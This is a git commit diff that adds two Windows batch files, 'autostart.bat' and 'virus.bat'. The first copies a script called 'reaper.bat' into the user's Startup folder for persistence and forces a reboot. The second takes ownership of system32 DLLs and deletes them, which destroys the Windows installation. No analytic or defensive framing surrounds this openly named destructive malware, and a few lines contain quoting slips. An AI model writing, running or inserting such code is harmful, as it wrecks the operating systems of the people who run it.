7b7dee735c4bbeb69199586e6a2f314fbf7a7a76
Misha <108226177+F3F5@users.noreply.github.com>
2023-02-12 00:18:22 +0400

    1.0

---
+++ autostart.bat
@@ -0,0 +1,3 @@
+@echo off
+copy reaper.bat C:\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\"Start Menu"\Programs\Startup
+shutdown /r /t 10
---
+++ virus.bat
@@ -0,0 +1,5 @@
+@echo off
+cd "%SystemRoot%"
+takeown /f system32 *.dll /r >null
+shutdown /r /t 10
+del "%SystemRoot%"\system32" *.dll /q >null
